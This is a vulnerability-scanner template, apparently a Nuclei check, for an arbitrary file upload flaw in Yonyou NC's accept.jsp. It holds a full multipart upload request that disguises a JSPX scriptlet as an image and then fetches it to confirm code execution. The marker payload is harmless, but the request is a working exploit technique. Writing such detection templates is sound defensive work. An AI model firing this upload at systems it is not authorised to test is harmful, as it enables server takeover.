@@ -1,0 +1,56 @@
+id: yonyou-nc-acceptjsp-file-upload
+info:
+  name: Yonyou NC accept.jsp File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Yonyou NC contains an arbitrary file upload vulnerability in the /aim/equipmap/accept.jsp route. Attackers can upload arbitrary files, execute arbitrary code on the server, and potentially gain full control.
+  tags: fileupload
+variables:
+  rand1: "{{rand_base(6)}}"
+  rand2: "{{rand_base(6)}}"
+  payload: |
+    <jsp:root xmlns="http://www.w3.org/1999/xhtml" version="2.0" xmlns:jsp="http://java.sun.com/JSP/Page" xmlns:c="http://java.sun.com/jsp/jstl/core">  
+    <jsp:directive.page contentType="text/html;charset=UTF-8" language="java" />  
+    <jsp:scriptlet>
+    out.println("{{rand1}}");
+    new java.io.File(application.getRealPath(request.getServletPath())).delete();
+    </jsp:scriptlet>
+    </jsp:root>
+http:
+  - raw:
+      - |
+        POST /aim/equipmap/accept.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryQLdBUKFoDLaANtgB
+
+        ------WebKitFormBoundaryQLdBUKFoDLaANtgB
+        Content-Disposition: form-data; name="file"; filename="images.jpg"
+        Content-Type: image/jpeg
+
+        {{payload}}
+        ------WebKitFormBoundaryQLdBUKFoDLaANtgB
+        Content-Disposition: form-data; name="fname"
+
+        /webapps/nc_web/{{rand2}}.jspx
+        ------WebKitFormBoundaryQLdBUKFoDLaANtgB--
+    matchers:
+      - type: word
+        words:
+          - "The real file"
+          - "parent.afterUpload(1)"
+        part: body
+    extractors:
+      - type: dsl
+        dsl:
+          - "concat('/webapps/nc_web/', '{{rand2}}', '.jspx')"
+  - raw:
+      - |
+        GET /webapps/nc_web/{{rand2}}.jspx HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "{{rand1}}"
+        part: body
